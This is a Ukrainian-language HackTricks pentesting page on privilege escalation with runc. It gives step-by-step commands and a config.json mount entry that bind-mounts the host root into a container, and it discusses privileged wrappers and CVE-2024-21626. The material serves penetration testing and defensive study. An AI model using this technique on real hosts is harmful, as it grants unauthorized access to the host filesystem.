# RunC Підвищення привілеїв

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Якщо ви хочете дізнатися більше про **runc**, перегляньте цю сторінку:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Якщо `runc` доступний rootful-процесу на хості, можна використати OCI bundle, конфігурація монтування якого рекурсивно виконує bind-mount хостового `/` у `/` всередині контейнера, відкриваючи файлову систему хоста в цьому просторі імен монтувань.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> Документований робочий процес `runc run` передбачає запуск від root: у власних прикладах runc позначає його як «run as root». Непривілейованому користувачеві потрібна конфігурація rootless, наприклад `runc spec --rootless`; у документації runc зазначено, що для цього режиму мають бути ввімкнені user namespaces.<sup>[[1]](#references)</sup>

## Привілейовані обгортки та версії runtime

Привілейована обгортка, що приймає контрольований викликачем OCI bundle, може відкривати доступ до файлів хоста, якщо дозволяє небезпечні bind-монтування. Перевірте, чи обгортка розв’язує переходи вгору каталогами та символічні посилання перед перевіркою джерел і цілей монтування, а також чи обмежує `process.cwd`. Саме по собі правило sudo або файл `config.json`, доступний для запису, не доводить, що обгортка прийме bundle або запустить його з привілеями хоста.

Окремо, [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv) стосувалася upstream-версій `runc` від `1.0.0-rc93` до `1.1.11`; у версії `1.1.12` міститься upstream-виправлення. Витік файлових дескрипторів і недостатня перевірка робочого каталогу могли призвести до того, що процес контейнера опинявся поза його кореневим каталогом у певних робочих процесах `runc run` або `runc exec`. Номери файлових дескрипторів залежать від способу виклику, а номер версії сам по собі не свідчить про можливість експлуатації, якщо постачальник переніс виправлення або викликач не може впливати на виклик привілейованого runtime.

## References

- [1] [runc: інструмент CLI для запуску та виконання контейнерів](https://github.com/opencontainers/runc#using-runc)
- [2] [Специфікація OCI Runtime: монтування](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Спільні піддерева](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
